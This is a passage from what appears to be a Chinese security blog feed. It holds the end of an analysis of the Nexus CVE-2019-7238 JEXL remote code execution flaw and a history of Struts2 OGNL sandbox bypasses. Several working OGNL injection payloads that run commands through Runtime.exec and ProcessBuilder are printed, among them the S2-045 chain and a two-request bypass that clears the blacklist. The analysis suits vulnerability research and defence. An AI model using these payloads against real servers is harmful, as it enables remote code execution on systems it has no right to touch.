class="line">ExtDirectModule$configure:60 # 路由绑定与请求解析</span><br><span class="line">  ExtDirectServlet$doPost:155 # 处理post请求</span><br><span class="line">    DirectJNgineServlet$doPost:595 # 根据不同的Content-Type来解析请求</span><br><span class="line">      DirectJNgineServlet$processRequest:632 # 解析json请求</span><br><span class="line">        JsonRequestProcesor$process:119 # 解析json语法树</span><br><span class="line">          JsonRequestProcessor$getIndividualJsonRequests:216 # 提取json数据</span><br><span class="line">        JsonRequestProcesor$process:133 # 构造返回结构</span><br><span class="line">ComponentComponent$previewAssets:188 # 解析post包中的data数据并构造查询语句查询包</span><br><span class="line">  ComponentComponent$previewAssets:208 # 获得查询结果</span><br><span class="line">    BrowseServiceImpl$previewAssets:252 # 构建OrientDb查询语句</span><br><span class="line">    BrowseServiceImpl$previewAssets:258 # 拼接查询语句</span><br><span class="line">    BrowseServiceImpl$previewAssets:262 # 执行查询</span><br><span class="line">      MetadataNodeEntityAdapter$countByQuery:221 # 执行OrientDb查询语句</span><br><span class="line">ContextExpressionFunction$execute:125 # 提取jexl表达式</span><br><span class="line">  ContextExpressionFunction$checkJexlExpression:154 # 执行jexl表达式</span><br></pre></td></tr></table></figure><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>漏洞的触发主要分两部分：post包解析及jexl表达式执行。</p><h2 id="2-1-post包解析"><a href="#2-1-post包解析" class="headerlink" title="2.1 post包解析"></a>2.1 post包解析</h2><p>首先先看一下web.xml中如何做的路由解析：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504603584828.jpg" alt=""></p><p><code>org.sonatype.nexus.bootstrap.osgi.DelegatingFilter</code>拦截了所有的请求，大概率为动态路由加载，动态路由加载需要配置相应的<code>Module</code>模块用代码将配置与路由进行绑定并显式加载servlet，而该漏洞的入口就在<code>org.sonatype.nexus.extdirect.internal.ExtDirectModule#configure</code>中:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504698938286.jpg" alt=""></p><p>直接跟进<code>org.sonatype.nexus.extdirect.internal.ExtDirectServlet$doPost</code>:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504699262539.jpg" alt=""></p><p>继续向下更进看到处理post请求的部分：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504702237568.jpg" alt=""></p><p>在这里我们跟进看一下如何对json格式的请求进行处理：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504702513086.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504706911673.jpg" alt=""></p><p>首先对json的语法树进行解析，将数据提取出来：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504708404906.jpg" alt=""></p><p>可以看到需要5个变量分别为<code>action</code>、<code>method</code>、<code>tid</code>、<code>type</code>、<code>data</code>。</p><p>注意到<code>isBatched</code>是由参数长度决定的，而返回的一个数组，其长度为1，所以<code>isBatched</code>为<code>false</code>。之后就是传入<code>processIndividualRequestsInThisThread</code>方法中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504715738470.jpg" alt=""></p><p>在这里构造返回的结果，可以看到这里在有一个json反序列化的过程，这里主要是将返回结果以json格式返回。</p><h2 id="2-2-jexl表达式执行"><a href="#2-2-jexl表达式执行" class="headerlink" title="2.2 jexl表达式执行"></a>2.2 jexl表达式执行</h2><p>从post包的解析中可以得知我们需要构造5个参数，同时当我们构造好<code>action</code>和<code>method</code>后，可以直接动态调用相应的类与方法。</p><p>这个漏洞出现在<code>org.sonatype.nexus.coreui.ComponentComponent#previewAssets</code>:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504724137293.jpg" alt=""></p><p>首先将post包中<code>repositoryName</code>、<code>expression</code>、<code>type</code>的值取出来，这三个参数分别代表已经存在的<code>repository</code>的名字、expression的类型，以及表达式。</p><p>着重看一下jexl的处理过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504726133105.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504726645374.jpg" alt=""></p><p>注意到这里只是实例化了一个<code>JexlSelector</code>对象，而并没有调用<code>evaluate</code>来执行表达式，所以漏洞的触发点在其他的位置。而真正的表达式执行点在<code>browseService.previewAssets</code>的处理过程中，这一点也是这个漏洞最为难找的一个点。</p><p>跟进<code>previewAssets</code>的实现，在<code>org.sonatype.nexus.repository.browse.internal.BrowseServiceImpl#previewAssets</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504739454711.jpg" alt=""></p><p>在这里可以看到表达式最后会被当做参数形成SQL查询，最后由OrientDb执行：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504742411091.jpg" alt=""></p><p>但是OrientDb本身是没有<code>contentExpression</code>这个方法的，也就是说明这个方法是用Java来实现的，找了一下，在<code>org.sonatype.nexus.repository.selector.internal.ContentExpressionFunction</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504753654778.jpg" alt=""></p><p>在<code>checkJexlExpression</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504754823135.jpg" alt=""></p><p>调用了<code>selectorManage.evaluate</code>来执行jexl表达式：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504755769130.jpg" alt=""></p><h1 id="0x03-构造POC"><a href="#0x03-构造POC" class="headerlink" title="0x03 构造POC"></a>0x03 构造POC</h1><p>通过上面的分析，我们只需要按照post包解析中的参数进行相应的构造即可，下面为一个例子：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15505678890758.jpg" alt=""></p><p>注意，这个漏洞需要当Nexus中存在已有的jar包，在本地验证的时候先传一个jar报上去。至于原理分析可能后面会单独再拿出来分析。</p><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019" target="_blank" rel="noopener">https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇分析其实在上周五也就是2月15号左右就已经分析完了，但是当时没有及时发出来，当周一看到iswin dalao发出的详尽分析后才把这篇分析发布做了预警算是慢了n步2333…&lt;/p&gt;
&lt;p&gt;总体来说这个漏洞流程是比较好分析的，真正的难度是找漏洞触发点，当时分析的时候找了半天没找到触发点，最后还是硬着头皮在OrientDb的处理流程中绕了半天才意识到…还是太菜了&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Nexuss" scheme="https://lucifaer.com/tags/Nexuss/"/>
    
  </entry>
  
  <entry>
    <title>浅析OGNL的攻防史</title>
    <link href="https://lucifaer.com/2019/01/16/%E6%B5%85%E6%9E%90OGNL%E7%9A%84%E6%94%BB%E9%98%B2%E5%8F%B2/"/>
    <id>https://lucifaer.com/2019/01/16/浅析OGNL的攻防史/</id>
    <published>2019-01-16T07:04:00.000Z</published>
    <updated>2019-01-16T07:06:03.855Z</updated>
    
    <content type="html"><![CDATA[<p>在分析Struts2漏洞的过程中就一直想把OGNL的运行机制以及Struts2对OGNL的防护机制总结一下，但是一直苦于自己对Struts2的理解不是很深刻而迟迟无法动笔，最近看了<a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit" target="_blank" rel="noopener">lgtm的这篇文章</a>收获良多，就想在这篇文章的基础上总结一下目前自己对于OGNL的一些理解，希望师傅们斧正。</p><a id="more"></a><h1 id="0x01-OGNL与Struts2"><a href="#0x01-OGNL与Struts2" class="headerlink" title="0x01 OGNL与Struts2"></a>0x01 OGNL与Struts2</h1><h2 id="1-1-root与context"><a href="#1-1-root与context" class="headerlink" title="1.1 root与context"></a>1.1 root与context</h2><p>OGNL中最需要理解清楚的是<code>root</code>（根对象）、<code>context</code>（上下文）。</p><ul><li><code>root</code>：root可以理解为是一个java对象，表达式所规定的所有操作都是通过root来指定其对哪个对象进行操作。</li><li><code>context</code>：context可以理解为对象运行的上下文环境，context以MAP的结构，利用键值对关系来描述对象中的属性以及值。</li></ul><p>Struts2框架使用了标准的命名上下文（naming context，我实在是不知道咋翻译了-. -）来执行OGNL表达式。处理OGNL的最顶层对象是一个Map对象，通常称这个Map对象为<code>context map</code>或者<code>context</code>。而OGNL的<code>root</code>就在这个<code>context map</code>中。<strong>在表达式中可以直接引用<code>root</code>对象的属性，如果需要引用其他的对象，需要使用<code>#</code>标明</strong>。</p><p>框架将OGNL里的<code>context</code>变成了我们的<code>ActionContext</code>，将<code>root</code>变成了<code>valueStack</code>。Struts2将其他对象和<code>valueStack</code>一起放在<code>ActionContext</code>中，这些对象包括<code>application</code>、<code>session</code>、<code>request context</code>的上下文映射。下面是一个图例：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464230621989.jpg" alt=""></p><h2 id="1-2-ActionContext"><a href="#1-2-ActionContext" class="headerlink" title="1.2 ActionContext"></a>1.2 ActionContext</h2><p><code>ActionContext</code>是action的上下文，其本质是一个MAP，简单来说可以理解为一个action的小型数据库，整个action生命周期（线程）中所使用的数据都在这个<code>ActionContext</code>中。而对于OGNL来说<code>ActionContext</code>就是充当<code>context</code>的，并且在框架中</p><p>这里盗一张图来说明<code>ActionContext</code>中存有哪些东西：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464139094502.jpg" alt=""></p><p> 可以看到其中有三个常见的作用域<code>request</code>、<code>session</code>、<code>application</code>。</p><ul><li><code>attr</code>作用域则是保存着上面三个作用域的所有属性，如果有重复的则以<code>request</code>域中的属性为基准。</li><li><code>paramters</code>作用域保存的是表单提交的参数。</li><li><code>VALUE_STACK</code>，也就是常说的值栈，保存着<code>valueStack</code>对象，也就是说可以通过<code>ActionContext</code>访问到<code>valueStack</code>中的值。</li></ul><h2 id="1-3-valueStack"><a href="#1-3-valueStack" class="headerlink" title="1.3 valueStack"></a>1.3 valueStack</h2><p>值栈本身是一个ArrayList，充当OGNL的<code>root</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464146328628.jpg" alt=""></p><p><code>root</code>在源码中称为<code>CompoundRoot</code>，它也是一个栈，每次操作<code>valueStack</code>的出入栈操作其实就是对<code>CompoundRoot</code>进行对应的操作。每当我们访问一个action时，就会将action加入到栈顶，而提交的各种表单参数会在<code>valueStack</code>从顶向下查找对应的属性进行赋值。</p><p>这里的<code>context</code>就是<code>ActionContext</code>的引用，方便在值栈中去查找action的属性。</p><h2 id="1-4-ActionContext和valueStack的关系"><a href="#1-4-ActionContext和valueStack的关系" class="headerlink" title="1.4 ActionContext和valueStack的关系"></a>1.4 ActionContext和valueStack的关系</h2><p>可以看到其实<code>ActionContext</code>和<code>valueStack</code>是“相互包含”的关系，当然准确点来说，<code>valueStack</code>是<code>ActionContext</code>中的一部分，而<code>ActionContext</code>所描述的也不只是一个OGNL<code>context</code>的代替品，毕竟它更多是为action构建一个独立的运行环境（新的线程）。而这样的关系就导致了我们可以通过<code>valueStack</code>访问<code>ActionContext</code>中的属性而反过来亦然。</p><p>其实可以用一种不是很标准的表达方式来描述这样的关系：可以把<code>valueStack</code>想成<code>ActionContext</code>的索引，你可以直接通过索引来找到表中的数据，也可以在表中找到所有数据的索引，无非是书与目录的关系罢了。</p><h1 id="0x02-OGNL的执行"><a href="#0x02-OGNL的执行" class="headerlink" title="0x02 OGNL的执行"></a>0x02 OGNL的执行</h1><h2 id="2-1-初始化ValueStack"><a href="#2-1-初始化ValueStack" class="headerlink" title="2.1 初始化ValueStack"></a>2.1 初始化ValueStack</h2><p>我们从代码的角度来看看OGNL的执行流。从Struts2框架的代码中，我们可以清楚的看到OGNL的包是位于<code>xwork2</code>中的，而连通Struts2与xwork2的桥梁就是<code>ActionProxy</code>，也就是说在<code>ActionProxy</code>接管整个控制权前，<code>FilterDispatcher</code>就已经完成了对<code>ActionContext</code>的建立与初始化。</p><p>而具体的代码是在<code>org.apache.struts2.dispatcher.PrepareOperations</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464833904918.jpg" alt=""></p><p>在这里如果没有Context存在的话，则会调用<code>ValueStackFactory</code>这个接口的<code>createValueStack</code>方法，跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464841735723.jpg" alt=""></p><p>跟进<code>OgnlValueStackFactory</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464842298773.jpg" alt=""></p><p>这几个参数分别为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464842534430.jpg" alt=""></p><p>跟进看一下<code>OgnlValueStack</code>的构造方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464844823917.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464845456793.jpg" alt=""></p><p>可以看到设置根、设置安全防范措施、以及调用<code>Ognl.createDefaultContext</code>来创建默认的<code>Context</code>映射：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464848098458.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464848456067.jpg" alt=""></p><p>这里我们跟到<code>OgnlContext</code>中看一下，有这么几个对象时比较重要的，他们规定了OGNL计算中的计算规则处理类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464982871371.jpg" alt=""></p><ul><li><code>_root</code>：在OgnlContext内维护着的Root对象，它是OGNL主要的操作对象</li><li><code>_values</code>：如果希望在OGNL计算时使用传入的Map作为上下文环境，OGNL依旧会创建一个OgnlContext，并将所传入的Map中所有的键值对维护在<code>_values</code>变量中。这个变量就被看作真正的容器，并在OGNL的计算中发挥作用。</li><li><code>ClassResolver</code>：指定处理class loading的处理类。实际上这个处理类是用于指定OGNL在根据Class名称来构建对象时，寻找Class名称与对应的Class类之间对应关系的处理方式。在默认情况下会使用JVM的class.forName机制来处理。</li><li><code>TypeConverter</code>：指定处理类型转化的处理类。这个处理类非常关键，它会指定一个对象属性转化成字符串以及字符串转化成Java对象时的处理方式。</li><li><code>MemberAccess</code>：指定处理属性访问策略的处理方式。</li></ul><p>可以看到这里的<code>ClassResolver</code>是有关类的寻址以及调用的，也就是常说的所谓的执行。</p><h2 id="2-2-将现有的值和字段添加进ValueStack中（构造）"><a href="#2-2-将现有的值和字段添加进ValueStack中（构造）" class="headerlink" title="2.2 将现有的值和字段添加进ValueStack中（构造）"></a>2.2 将现有的值和字段添加进ValueStack中（构造）</h2><p>在初始化了<code>ValueStack</code>后，发现了后面的<code>container.inject(stack);</code>，这里是将依赖项注入现有的字段和方法，而在这个地方会调用<code>com.opensymphony.xwork2.ognl.OgnlValueStack$setOgnlUtil</code>将我们所关心的黑名单给添加进来：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469425702400.jpg" alt=""></p><p>然而其根本的作用是<strong>创建<code>_memberAccess</code></strong>。<br>这里可以注意到调用栈中首先是初始化了<code>ValueStack</code>之后再通过<code>OgnlUtil</code>这个API将数据和方法注入进<code>ValueStack</code>中，而<code>ValueStack</code>又是利用<code>OgnlContext</code>来创建的，所以会看到<code>OgnlContext</code>中的<strong><code>_memberAccess</code>与<code>securityMemberAccess</code>是同一个<code>SecurityMemberAccess</code>类的实例，而且内容相同，也就是说全局的<code>OgnlUtil</code>实例都共享着相同的设置。如果利用<code>OgnlUtil</code>更改了设置项（<code>excludedClasses</code>、<code>excludedPackageNames</code>、<code>excludedPackageNamePatterns</code>）则同样会更改<code>_memberAccess</code>中的值。</strong></p><p>这里可能不太好理解，可以看下面这几张图：</p><ol><li><p>首先<code>ValueStack</code>本身是个<code>OgnlContext</code></p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15470170533527.jpg" alt=""></p></li><li><p>之后调用<code>setOgnlUtil</code>添加黑名单：</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469425702400.jpg" alt=""></p></li><li><p>然后<code>OgnlUtil</code>中的这些值赋给<code>SecurityMemberAccess</code>：</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15470167097980.jpg" alt=""></p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15470168699567.jpg" alt=""></p></li><li><p>也就是与<code>OgnlContext</code>中的<code>_memberAccess</code>建立关系，即创建了<code>_memberAccess</code>：</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15470176048468.jpg" alt=""></p></li></ol><p>而这一点在沙箱绕过时起到了很重要的作用。</p><h2 id="2-3-创建拦截器（Interceptor）"><a href="#2-3-创建拦截器（Interceptor）" class="headerlink" title="2.3 创建拦截器（Interceptor）"></a>2.3 创建拦截器（Interceptor）</h2><p>在之后当控制权转交给<code>ActionProxy</code>时会调用<code>OgnlUtil</code>作为操作OGNL的API，在创建拦截器（<code>Interceptor</code>）时会调用<code>com.opensymphony.xwork2.config.providers.InterceptorBuilder</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469435251224.jpg" alt=""></p><p>在这里利用工场函数来创建拦截器，跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469435768671.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469447377180.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469449020784.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469449199402.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469449399481.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469449602034.jpg" alt=""></p><p>也就是把设置好的黑名单赋到<code>SecurityMemberAccess</code>中，在当前的上下文中用以检验表达式所调用的方法是否允许被调用。</p><h2 id="2-4-OGNL执行（利用反射调用）"><a href="#2-4-OGNL执行（利用反射调用）" class="headerlink" title="2.4 OGNL执行（利用反射调用）"></a>2.4 OGNL执行（利用反射调用）</h2><p>说完了初始化，再来说一下所谓的OGNL执行，在这里引用一下《Struts2技术内幕》这本书的一个表，这个表主要列举了OGNL计算时所需要遵循的一些重要的计算规则和默认实现类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464991029777.jpg" alt="-w768"></p><p>接下来就跟进<code>CompoundRootAccessor</code>看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464991684892.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15465008912903.jpg" alt=""></p><p>在这里拓展了<code>ognl.DefaultClassResovler</code>，可以支持一些特殊的class名称。</p><h1 id="0x03-OGNL的攻防史"><a href="#0x03-OGNL的攻防史" class="headerlink" title="0x03 OGNL的攻防史"></a>0x03 OGNL的攻防史</h1><p>回看S2系列的漏洞，每当我们找到一个可以执行OGNL表达式的点在尝试构造恶意的OGNL时都会遇到这个防护机制，在我看了<a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit" target="_blank" rel="noopener">lgtm</a>这篇文章后，我就想把围绕<code>SecurityMemberAccess</code>的攻防历史来全部梳理一遍。</p><p>可以说所有在对于OGNL的攻防全部都是基于如何使用静态方法。<code>Struts2</code>的防护措施从最开始的正则，到之后的黑名单，在保证OGNL强大功能的基础上，将可能执行静态方法的利用链给切断。在分析绕过方法时，需要注意的有这么几点：</p><ul><li><code>struts-defult.xml</code>中的黑名单</li><li><code>com.opensymphony.xwork2.ognl.SecurityMemberAccess</code></li><li><code>Ognl</code>包</li></ul><p>以下图例左边都是较为新的版本，右边为老版本。</p><h2 id="3-1-Struts-2-3-14-1版本前"><a href="#3-1-Struts-2-3-14-1版本前" class="headerlink" title="3.1 Struts 2.3.14.1版本前"></a>3.1 Struts 2.3.14.1版本前</h2><p>S2-012、S2-013、S3-014的出现促使了这次更新，可以说在跟新到2.3.14.1版本前，ognl的利用基本属于不设防状态，我们可以看一下这两个版本的diff，不难发现当时还没有出现黑名单这样的说法，而修复的关键在于<code>SecurityMemberAccess</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15470237734614.jpg" alt=""></p><p>左边是2.3.14.1的版本，右边是2.3.14的版本，不难看出在这之前可以通过ognl直接更改<code>allowStaticMethodAccess=true</code>，就可以执行后面的静态方法了，所以当时非常通用的一种poc是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true).(@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;))</span><br></pre></td></tr></table></figure><p>而在2.3.14.1版本后将<code>allowStaticMethodAccess</code>设置成final属性后，就不能显式更改了，这样的poc显然也失效了。</p><h2 id="3-2-Struts-2-3-20版本前"><a href="#3-2-Struts-2-3-20版本前" class="headerlink" title="3.2 Struts 2.3.20版本前"></a>3.2 Struts 2.3.20版本前</h2><p>在2.3.14.1后虽然不能更改<code>allowStaticMethodAccess</code>了，但是还是可以通过<code>_memberAccess</code>使用类的构造函数，并且访问公共函数，所以可以看到当时有一种替代的poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#p=new java.lang.ProcessBuilder(&apos;xcalc&apos;)).(#p.start())</span><br></pre></td></tr></table></figure><p>直到2.3.20，这样的poc都可以直接使用。在2.3.20后，Struts2不仅仅引入了黑名单（excludedClasses, excludedPackageNames 和 excludedPackageNamePatterns），更加重要的是阻止了所有构造函数的使用，所以就不能使用<code>ProcessBuilder</code>这个payload了。</p><h2 id="3-3-Struts-2-3-29版本前"><a href="#3-3-Struts-2-3-29版本前" class="headerlink" title="3.3 Struts 2.3.29版本前"></a>3.3 Struts 2.3.29版本前</h2><p>左为2.3.29版本，右边为2.3.28版本</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15470227581652.jpg" alt=""></p><p>从黑名单中可以看到禁止使用了<code>ognl.MemberAccess</code>和<code>ognl.DefaultMemberAccess</code>，而这两个对象其实就是2.3.20-2.3.28版本的通用绕过方法，具体的思路就是利用<code>_memberAccess</code>调用静态对象<code>DefaultMemberAccess</code>，然后用<code>DefaultMemberAccess</code>覆盖<code>_memberAccess</code>。那么为什么说这样就可以使用静态方法了呢？<br>我们先来看一下可以在S2-032、S2-033、S2-037通用的poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec(&apos;xcalc&apos;))</span><br></pre></td></tr></table></figure><p>我们来看一下<code>ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471036060838.jpg" alt=""></p><p>看过上一节的都知道，在程序运行时在<code>setOgnlUtil</code>方法中将黑名单等数据赋给<code>SecurityMemberAccess</code>，而这就是创建<code>_memberAccess</code>的过程，在动态调试中，我们可以看到这两个对象的id甚至都是一样的，而<code>SecurityAccess</code>这个对象的父类本身就是<code>ognl.DefaultMemberAccess</code>，而其建立关系的过程就相当于继承父类并重写父类的过程，所以这里我们利用其父类<code>DefaultMemberAccess</code>覆盖<code>_memberAccess</code>中的内容，就相当于初始化了<code>_memberAccess</code>，这样就可以绕过其之前所设置的黑名单以及限制条件。</p><h2 id="3-4-Struts-2-3-30-2-5-2"><a href="#3-4-Struts-2-3-30-2-5-2" class="headerlink" title="3.4 Struts 2.3.30+/2.5.2+"></a>3.4 Struts 2.3.30+/2.5.2+</h2><p>到了2.3.30(2.5.2)之后的版本，我们可以使用的<code>_memberAccess</code>和<code>DefaultMemberAccess</code>都进入到黑名单中了，覆盖的方法看似就不行了，而这个时候S2-045的payload提供了一种新的思路：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&apos;xcalc&apos;))</span><br></pre></td></tr></table></figure><p>可以看到绕过的关键点在于：</p><ul><li>利用Ognl执行流程利用<code>container</code>获取了<code>OgnlUtil</code>实例</li><li>清空了<code>OgnlUtil$excludedClasses</code>黑名单，释放了<code>DefaultMemberAccess</code></li><li>利用<code>setMemberAccess</code>覆盖</li></ul><p>而具体的流程可以参考2.2的内容。</p><h2 id="3-5-Struts-2-5-16"><a href="#3-5-Struts-2-5-16" class="headerlink" title="3.5 Struts 2.5.16"></a>3.5 Struts 2.5.16</h2><p>分析过S2-057后，你会发现ognl注入很容易复现，但是想要调用静态方法造成代码执行变得很难，我们来看一下Struts2又做了哪些改动：</p><ul><li><p>2.5.13版本后禁止访问<code>coontext.map</code></p><p>  准确来说是ognl包版本的区别，在2.5.13中利用的是3.1.15版本，在2.5.12版本中使用的是3.1.12版本：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471155308956.jpg" alt=""></p><p>  而这个改变是在<code>OgnlContext</code>中：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471156088979.jpg" alt=""></p><p>  不只是get方法，put和remove都没有办法访问了，所以说从根本上禁止了对<code>context.map</code>的访问。</p></li><li><p>2.5.20版本后<code>excludedClasses</code>不可变了，具体的代码在<a href="https://github.com/apache/struts/commit/748da3f8ce6b9f3953bc418745c35a534e5b98ca" target="_blank" rel="noopener">这里</a></p></li></ul><p>所以在S2-045时可使用的payload已经没有办法再使用了，需要构造新的利用方式。</p><p>文章提出了这么一种思路:</p><ul><li>没有办法使用<code>context.map</code>，可以调用<code>attr</code>，前文说过<code>attr</code>中保存着整个<code>context</code>的变量与方法，可以通过<code>attr</code>中的方法返回给我们一个<code>context.map</code>。</li><li>没有办法直接调用<code>excludedClasses</code>，也就不能使用<code>clear</code>方法来清空，但是还可以利用<code>setter</code>来把<code>excludedClasses</code>给设置成空</li><li>清空了黑名单，我们就可以利用<code>DefaultMemberAccess</code>来覆盖<code>_memberAccess</code>，来执行静态方法了。</li></ul><p>而这里又会出现一个问题，当我们使用<code>OgnlUtil</code>的<code>setExcludedClasses</code>和<code>setExcludedPackageNames</code>将黑名单置空时并非是对于源（全局的OgnlUtil）进行置空，也就是说<code>_memberAccess</code>是源数据的一个引用，就像前文所说的，在每次<code>createAction</code>时都是通过<code>setOgnlUtil</code>利用全局的源数据创建一个引用，这个引用就是一个<code>MemberAccess</code>对象，也就是<code>_memberAccess</code>。所以这里只会影响这次请求的<code>OgnlUtil</code>而并未重新创建一个新的<code>_memberAccess</code>对象，所以旧的<code>_memberAccess</code>对象仍未改变。</p><p>而突破这种限制的方式就是再次发送一个请求，将上一次请求已经置空的<code>OgnlUitl</code>作为源重新创建一个<code>_memberAccess</code>，这样在第二次请求中<code>_memberAccess</code>就是黑名单被置空的情况，这个时候就释放了<code>DefaultMemberAccess</code>，就可以进行正常的覆盖以及执行静态方法。</p><p>poc为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(#context=#attr[&apos;struts.valueStack&apos;].context).(#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&apos;&apos;)).(#ognlUtil.setExcludedPackageNames(&apos;&apos;))</span><br><span class="line"></span><br><span class="line">(#context=#attr[&apos;struts.valueStack&apos;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&apos;curl 127.0.0.1:9001&apos;))</span><br></pre></td></tr></table></figure><p>需要发送两次请求：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471891401187.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471891816332.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471891957595.jpg" alt=""></p><h1 id="0x04-现阶段的OGNL"><a href="#0x04-现阶段的OGNL" class="headerlink" title="0x04 现阶段的OGNL"></a>0x04 现阶段的OGNL</h1><p>Struts2在 2.5.16版本后做了很多修改，截止到写文章的时候，已经更新到2.5.20，接下来我将把这几个版本的区别全部都列出来，并且说明现在绕过Ognl沙箱面临着哪些阻碍。同上一节，左边都为较新的版本，右边为较旧的版本。</p><h2 id="4-1-2-5-17的改变（限制命名空间）"><a href="#4-1-2-5-17的改变（限制命名空间）" class="headerlink" title="4.1 2.5.17的改变（限制命名空间）"></a>4.1 2.5.17的改变（限制命名空间）</h2><ol><li><p>黑名单的变动，禁止访问<code>com.opensymphony.xwork2.ognl.</code></p><p> <img 